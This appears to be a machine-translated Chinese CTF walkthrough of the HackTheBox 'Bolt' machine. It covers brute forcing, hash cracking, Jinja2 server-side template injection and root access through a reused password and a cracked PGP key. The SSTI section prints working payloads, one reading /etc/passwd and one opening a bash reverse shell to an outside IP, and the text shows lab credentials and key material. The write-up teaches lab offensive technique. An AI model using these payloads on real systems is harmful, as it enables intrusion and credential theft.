# 来自黑客盒子的螺栓—详细演练

> 原文：<https://infosecwriteups.com/bolt-from-hackthebox-detailed-walkthrough-4d60edf0b945?source=collection_archive---------3----------------------->

展示完成盒子所需的所有工具和技术。

# 机器信息

![](img/583b8a57b49411b61e27be1fdab2040e.png)

从箱子上取下螺栓

Bolt 是 HackTheBox 上的中型机。我们找到一个有档案的网站，我们下载并发现许多文件和文件夹。在其中搜索，我们发现了一个 sqlite 数据库，我们从这个数据库中转储哈希值，并破解以向仪表板显示管理员凭据。经过一些枚举，我们发现一个子域托管主站点的演示版本。我们使用服务器端模板注入来获得一个作为用户的反向 shell。围绕操作系统的更多枚举找到包含另一个子域的详细信息及其凭证的文件。我们也可以作为用户之一通过 SSH 访问，并在另一个数据库中找到更多信息。最终，我们有足够的信息来破解 pgp 加密的消息，并取回根密码。

所需的技能是网络，操作系统和数据库枚举知识。学习的技能是 SSTI 和使用 pgp 加密。

# 初步侦察

像往常一样，让我们从 Nmap 开始:

![](img/054b5f80412f11cde1521b839dd13641.png)

螺栓的 Nmap 扫描

我们有两个网站要看，先试试端口 80:

![](img/3fab4e169ed90129f92eb53ac5c8798d.png)

端口 80 上的网站

点击这里没什么可看的，登录按钮把我们带到这里:

![](img/f02660b66c7625fc4b9ffa6800fed946.png)

网站的登录页面

我尝试了 SQLi 和一些明显的用户/密码组合，有趣的是，我在尝试 admin 用户时得到了这个结果:

![](img/b2278ad15cb0318309d1748082fd2bc6.png)

拒绝访问消息

# 九头蛇蛮力

所以我们可以假设有一个管理员用户。我将让 Hydra 尝试强行登录:

![](img/d2fe9cff9a4b0b7b1671f63b2ee89835.png)

九头蛇暴力强制管理员密码

在等待的时候，我看了看菜单，找到了这个下载页面:

![](img/b53abaf48b7565c35ebbd518d7a2bf95.png)

Bolt 网站的下载部分

我下载了 tar 文件，查看了一下里面的内容:

```
┌──(root💀kali)-[~/htb/bolt]
└─# tar -xf image.tar

┌──(root💀kali)-[~/htb/bolt]
└─# ls -l 
total 308728
drwxr-xr-x 2 root root      4096 Mar  5  2021 47a36abf64f35c2950
drwxr-xr-x 2 root root      4096 Mar  5  2021 67911cd2257b95677c
drwxr-xr-x 2 root root      4096 Mar  5  2021 e378c04859185d27fa
drwxr-xr-x 2 root root      4096 Mar  5  2021 05a7ea69ad8d508dab
drwxr-xr-x 2 root root      4096 Mar  5  2021 352ed5c2e8a5e68162
drwxr-xr-x 2 root root      4096 Mar  5  2021 25ed8fe92ad6130c6b
drwxr-xr-x 2 root root      4096 Mar  5  2021 a3a5670950272789ad
drwxr-xr-x 2 root root      4096 Mar  5  2021 b92e2f297441f8c5cf
-rw-r--r-- 1 root root      3797 Mar  5  2021 1c21577a8fa50811.json
drwxr-xr-x 2 root root      4096 Mar  5  2021 a791ac8eec9f14bc77
drwxr-xr-x 2 root root      4096 Mar  5  2021 5029f6b527af2976f2
drwxr-xr-x 2 root root      4096 Mar  5  2021 e256ffc588a3e6cb26
-rw-r--r-- 1 kali kali 161765888 Oct 24 15:47 image.tar
-rw-r--r-- 1 root root      1002 Jan  1  1970 manifest.json
-rw-r--r-- 1 root root       119 Jan  1  1970 repositories
```

在其中一个文件夹中，我们看到了另一个 tar 文件:

```
┌──(root💀kali)-[~/htb/bolt/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad]
└─# ls
json  layer.tar  VERSION
```

我们可以递归地从任何包含 tar 的子文件夹中提取所有文件:

```
┌──(root💀kali)-[~/htb/bolt]
└─# find . -type f -iname "*.tar" -print0 -execdir tar xf {} \; -delete
```

# 邀请代码

现在我们可以在所有文件中查找感兴趣的字符串。这花了一段时间，但我最终找到了这个:

```
┌──(root💀kali)-[~/htb/bolt]
└─# grep -rn "Username" -A 3
<SNIP>
app/base/forms.py:17:    username = TextField('Username'     , id='username_create' , validators=[DataRequired()])
app/base/forms.py-18-    email    = TextField('Email'        , id='email_create'    , validators=[DataRequired(), Email()])
app/base/forms.py-19-    password = PasswordField('Password' , id='pwd_create'      , validators=[DataRequired()])
app/base/forms.py-20-    invite_code = TextField('Invite Code', id='invite_code'    , validators=[DataRequired()])
```

不知道 invite_code 是什么？这让我想到了这个:

```
┌──(root💀kali)-[~/htb/bolt/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad]
└─# grep -rn "invite_code" -A 1
<SNIP>
app/base/routes.py:63:        code        = request.form['invite_code']
app/base/routes.py-64-        if code != 'XNSS-HSJW-3NGU-8XTJ':
```

# SQLite

我当时不知道在哪里使用它，所以继续寻找。后来我找到了 sqlite 数据库:

![](img/b0ebf652d2852ec59c2518241d61dedb.png)

SQLite 数据库枚举

# 哈希破解

上面我已经打开了数据库文件，并转储了管理员密码散列。现在我们可以尝试破解它:

![](img/e235b001e49741dac0c508767094861a.png)

给那个散列命名

看起来像是 MD5 地穴。让约翰来做吧:

```
┌──(root💀kali)-[~/htb/bolt]
└─# john hash.txt -format=md5crypt -w=/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>         (?)
1g 0:00:00:00 DONE (2021-10-24 22:23) 2.000g/s doida..curtis13
Session completed
```

这很快，但是回头看看 Hydra，我们看到它在很久以前就通过强制登录页面找到了相同的密码:

![](img/01d61eba5fe3afc174259c7217636845.png)

九头蛇破解了密码

我们是来学习的，所以不要为此烦恼！

# 仪表板访问

返回登录页面，使用我们现在拥有的凭据，我们会看到一个控制面板:

![](img/765d5f614e23ea69a8873ccb52cea4ce.png)

管理仪表板

这里没有很多，但我在直接聊天框中看到了一些有趣的东西:

![](img/cc5477a457f86d54a1e3a66f96a7c522.png)

与亚历山大和莎拉聊天

# Gobuster

Sarah 提到了一个仅限 invite 的演示环境，之前我们在源代码中发现了一个 invite 代码。寻找子域的时间到了:

![](img/28ab63ec02d6f4e1f8e69c9c171926d2.png)

Gobuster 搜索子域

我们有两个，将它们添加到/etc/hosts，然后查看演示，我们会看到与之前相同的登录页面，只是现在我们可以创建一个帐户:

![](img/0da2f679058c39a5cd58814e3c4efccc.png)

在演示系统上创建一个帐户

# 演示门户

我们现在可以登录演示门户，并在此结束:

![](img/1717ce5a8958f28738008b5523272e56.png)

登录到演示门户

环顾演示网站，我没有发现任何有趣的东西，但在底部，我注意到该网站是使用 Flask 创建的:

![](img/ac4f7c0e6423ee11dd047b14a7a95101.png)

页脚显示网站是一个管理瓶

在搜索漏洞时，我发现了很多有用的信息，比如黑客技巧[这里](https://book.hacktricks.xyz/pentesting/pentesting-web/flask)和[这里](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)。这让我看到了[这份](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)备忘单和[这份](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)指南。

# SSTI

在阅读和尝试了一些例子之后，我确认了我们在概要文件部分有一个服务器端模板注入漏洞。从 PayloadsAllTheThings Jinja2 示例中，我发现这个示例可以读取 passwd 文件:

```
{{ get_flashed_messages.__globals__.__builtins__.open(“/etc/passwd”).read() 
}}
```

我们只需转到用户的设置，并将其输入名称字段:

![](img/7522098c9e7de047483ebd53c099e8df.png)

在用户名字段中输入有效负载

单击提交按钮，然后切换到另一个浏览器选项卡，登录 mail.bolt.htb 查看我们收到的电子邮件:

![](img/116cfd9b97cdef2bd5da1eafd94a84cc.png)

检查用户确认配置文件更改的邮件

如果我们单击该电子邮件中的链接，我们将收到第二封电子邮件，确认已进行了更改:

![](img/0de37cd797a1c821d2c0f9858f226587.png)

带有我们泄漏数据的确认电子邮件

# 反向外壳

我们可以看到 passwd 文件的内容，确认我们有服务器端代码执行。现在我们可以用同样的方法来处理一个反向的 shell。我不得不尝试几个不同的例子，最终我发现这一个可行:

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(‘/bin/bash -c “/bin/bash -i >& /dev/tcp/10.10.14.192/4444 0>&1”’).read() 
}}
```

像之前一样改变配置文件，提交，切换到邮件，并点击其中的链接，以启动我们的反向外壳。切换到 Kali 上等待的 netcat 监听器，我们看到我们连接上了:

```
┌──(root💀kali)-[~/htb/bolt]
└─# nc -nlvp 4444  
listening on [any] 4444 ...
connect to [10.10.14.192] from (UNKNOWN) [10.10.11.114] 60402
bash: cannot set terminal process group (997): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/demo$
```

首先让我们升级我们的外壳:

```
www-data@bolt:/$ which python3
/usr/bin/python3
www-data@bolt:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@bolt:/$ ^Z  
zsh: suspended  nc -nlvp 4444
┌──(root💀kali)-[~/htb/bolt]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
www-data@bolt:/$
```

检查我们有哪些用户:

```
www-data@bolt:/etc/passbolt$ ls -l /home
total 8
drwxr-x--- 15 clark clark 4096 Feb 25  2021 clark
drwxr-x--- 16 eddie eddie 4096 Aug 26 23:55 eddie
```

# 密码文件

两个用户，但无权访问他们。在尝试 LinPEAS 之前，我四处寻找任何不合适的地方，发现了这个文件夹:

```
www-data@bolt:/$ find . \! -group root -d -maxdepth 2 2>/dev/null
<SNIP>
./etc/passbolt
```

它位于/etc 中，与那里的所有其他文件夹相比非常突出，因为它属于 www-data 组，而不是 root。我快速检查了一下里面有什么有趣的东西:

```
www-data@bolt:/etc/passbolt$ grep -rn "password"     
<SNIP>
app.php:106:  'password' => env('CACHE_DEFAULT_PASSWORD', null),
app.php:127:  'password' => env('CACHE_CAKECORE_PASSWORD', null),
app.php:149:  'password' => env('CACHE_CAKEMODEL_PASSWORD', null),
app.php:232:   * The keys host, port, timeout, username, password, client and tls
app.php:242:  'password' => env('EMAIL_TRANSPORT_DEFAULT_PASSWORD', null),
app.php:330:  'password' => env('DATASOURCES_DEFAULT_PASSWORD', ''),
app.php:361:  'password' => env('DATASOURCES_TEST_PASSWORD', 'secret'),
passbolt.php:3: * Passbolt ~ Open source password manager for teams
passbolt.php:42:            'password' => '<HIDDEN>',
```

在 passbolt.php 的文件中，我们找到了另一个网站和数据库凭证:

```
'App' => [
    // A base URL to use for absolute links.
    // The url where the passbolt instance will be reachable to your end users.
    // This information is need to render images in emails for example
    'fullBaseUrl' => 'https://passbolt.bolt.htb',
],
// Database configuration.
'Datasources' => [
    'default' => [
        'host' => 'localhost',
        'port' => '3306',
        'username' => 'passbolt',
        'password' => 'rT2;jW7<eY8!dX8}pQ8%',
        'database' => 'passboltdb',
    ],
],
```

https 上的这个网站是我们还没看的。我将 passbolt 子域添加到我的 hosts 文件中，然后浏览它，我们得到另一个登录表单:

![](img/58fa0523acf327fbc778cd6820189fd6.png)

Passbolt 登录表单

然而，这个网站没有以任何方式连接到我们之前创建了一个电子邮件地址帐户的演示版。所以现在看来这是个死胡同。

回到 passbolt.php 文件，我尝试了我们找到的两个用户的凭证，以防他们重复使用密码:

```
www-data@bolt:/etc/passbolt$ su clark
Password: 
su: Authentication failure
www-data@bolt:/etc/passbolt$ su eddie
Password: 
eddie@bolt:/etc/passbolt$
```

# 以 Eddie 身份进行 SSH 访问

成功！Eddie 为他的用户帐户重用了数据库配置中的密码。让我们退出这个服务 shell，通过 SSH 以他的身份登录:

```
┌──(root💀kali)-[~/htb/bolt]
└─# ssh eddie@bolt.htb
eddie@bolt.htb's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-051300-generic x86_64)

You have mail.
Last login: Mon Oct 25 06:40:23 2021 from 10.10.14.75
eddie@bolt:~$
```

它说我们有邮件，让我们检查属于埃迪的文件和文件夹，看看它可能在哪里:

![](img/46711b70c2a55ec364e7c5c85484316f.png)

在子文件夹中搜索属于埃迪的文件

我们在他的个人文件夹里发现了一个谷歌 Chrome 的个人资料，这肯定是可疑的。我们还找到了他邮件的位置，让我们来看看:

![](img/12fe470bbea90f5de3bd531c51189c7e.png)

埃迪邮件找到了

# PGP 私钥

一个很大的线索是 Eddie 用 Chrome 存储了一个私钥。让我们在他的主文件夹中搜索包含标准 PGP 密钥的文件:

```
eddie@bolt:~$ grep -rn 'BEGIN PGP PRIVATE KEY BLOCK'
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:27039:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:32061:            // BEGIN PGP PRIVATE KEY BLOCK
.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:32409:      result.push("-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n");
Binary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
```

二进制文件 000003.log 匹配。让我们看看里面:

```
eddie@bolt:~$ cat '.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log'
<SNIP>                                  
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/
r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/
qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r\\nAAH+CQMINK+e85VtWtjguB8IR
<SNIP>
9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\r\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\r\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----
```

我们可以在文件中看到完整的私钥。剪切开始和结束部分之间的块，并粘贴/回显到 Kali 上的一个文件，如下所示:

```
┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_private_key                                         
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\nVersion: OpenPGP.js v4.10.9\\r\\nComment: https://openpgpjs.org\\r\\n\\r\\nxcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/
r1KlhWlTi\\r\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/
<SNIP>
\\r\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r\\nPSwYYWlAywj5\\r\\n=cqxZ\\r\\n-----END PGP PRIVATE KEY BLOCK-----
```

现在使用 SED 删除多余的\r 和\n:

```
┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_private_key | sed 's/\\\\r\\\\n/\n/g' > eddie_id_rsa

┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_id_rsa                                              
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
<SNIP>
11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm
YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0
PSwYYWlAywj5
=cqxZ
-----END PGP PRIVATE KEY BLOCK-----
```

# 开膛手约翰

我们可以用 JohnTheRipper 试着破解私钥。首先转换成 John 可以使用的散列:

```
┌──(root💀kali)-[~/htb/bolt]
└─# john eddie_pgp_hash --format=gpg --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>   (Eddie Johnson)
1g 0:00:07:50 DONE (2021-10-26 22:31) 91.02C/s mhines..menudo
Session completed
```

# MySQL 访问

这很简单，但是我们需要这个做什么？回头看看我们之前找到的 passbolt.php 文件，我们有没有尝试过的数据库凭证。现在让我们看看那里:

![](img/5764b4e8f8183947dae87f6041c0e0b2.png)

浏览 mysql 数据库

# PGP 消息

我们找到一个名为 secrets 的表，其中有一条用我们刚刚破解的私钥加密的消息。从数据库中复制 PGP 消息，并粘贴到 Kali:

```
┌──(root💀kali)-[~/htb/bolt]
└─# cat eddie_pgp_message 
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
<SNIP>
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
```

现在我们有了用 PGP 加密的信息，以及解码它的密码，现在我们已经破解了私钥。所以我们可以很容易地解密文件来查看内容，首先导入私钥:

```
┌──(root💀kali)-[~/htb/bolt]
└─# gpg --import eddie_pgp_priv_key
```

弹出一个窗口，输入我们刚刚破解的密码:

```
┌────────────────────────────────────────────────────────────────┐
│ Please enter the passphrase to import the OpenPGP secret key:  │
│ "Eddie Johnson <eddie@bolt.htb>"                               │
│ 2048-bit RSA key, ID 1C2741A3DC3B4ABD,                         │
│ created 2021-02-25\.                                            │
│                                                                │
│                                                                │
│ Passphrase: **************____________________________________ │
│                                                                │
│         <OK>                                    <Cancel>       │
└────────────────────────────────────────────────────────────────┘
```

我们看到密钥被导入:

```
gpg: /root/.gnupg/trustdb.gpg: trustdb created
gpg: key 1C2741A3DC3B4ABD: public key "Eddie Johnson <eddie@bolt.htb>" imported
gpg: key 1C2741A3DC3B4ABD: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

现在解密我们从盒子上的秘密表中复制的信息:

```
┌──(root💀kali)-[~/htb/bolt]
└─# gpg -d eddie_pgp_message
```

窗口再次弹出，再次输入或破解密码:

```
┌────────────────────────────────────────────────────────────────┐
│ Please enter the passphrase to unlock the OpenPGP secret key:  │
│ "Eddie Johnson <eddie@bolt.htb>"                               │
│ 2048-bit RSA key, ID F65CA879A3D77FE4,                         │
│ created 2021-02-25 (main key ID 1C2741A3DC3B4ABD).             │
│                                                                │
│                                                                │
│ Passphrase: **************____________________________________ │
│                                                                │
│         <OK>                                    <Cancel>       │
└────────────────────────────────────────────────────────────────┘
```

现在我们看到了消息的内容:

```
gpg: encrypted with 2048-bit RSA key, ID F65CA879A3D77FE4, created 2021-02-25
      "Eddie Johnson <eddie@bolt.htb>"
{"password":"<HIDDEN>","description":""}gpg: Signature made Sat 06 Mar 2021 03:33:54 PM GMT
gpg:                using RSA key 1C2741A3DC3B4ABD
gpg: Good signature from "Eddie Johnson <eddie@bolt.htb>" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: DF42 6BC7 A4A8 AF58 E50E  DA0E 1C27 41A3 DC3B 4ABD
```

# 根标志

我们有另一个密码，这次是给 root 的。我们可以切换用户并获取标志:

```
eddie@bolt:~$ su
Password: 

root@bolt:/home/eddie# id
uid=0(root) gid=0(root) groups=0(root)

root@bolt:/home/eddie# cat /root/root.txt
<HIDDEN>
```

如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)

推特—[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
网站— [https://pencer.io](https://pencer.io/)

*原载于 2022 年 2 月 21 日*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-bolt/)*。*

# 🔈 🔈Infosec Writeups 正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有 16 个令人难以置信的演讲者和 10 多个小时充满力量的讨论会议。[查看更多详情并在此注册。](https://iwcon.live/)

[](https://iwcon.live/) [## IWCon2022 - Infosec 书面报告虚拟会议

### 与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…

iwcon.live](https://iwcon.live/)